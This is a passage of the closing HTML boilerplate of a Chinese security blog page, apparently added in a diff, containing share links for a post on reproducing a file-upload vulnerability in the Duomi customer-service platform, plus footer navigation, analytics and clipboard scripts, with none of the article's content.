+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&title=朵米客服平台漏洞复现"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&title=朵米客服平台漏洞复现"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&name=朵米客服平台漏洞复现&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://crispsheep.icu/2025/01/19/%E6%9C%B5%E7%B1%B3%E5%AE%A2%E6%9C%8D%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/&t=朵米客服平台漏洞复现"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2024-2025
+        CrispSheep
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">首页</a></li><!--
+        --><!--
+          --><li><a href="/about/">关于</a></li><!--
+        --><!--
+          --><li><a href="/archives/">归档</a></li><!--
+        --><!--
+          --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+    <a href="https://beian.miit.gov.cn/" target="_blank"> 豫ICP备2024078046号-1</a>  
+</footer>
+
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
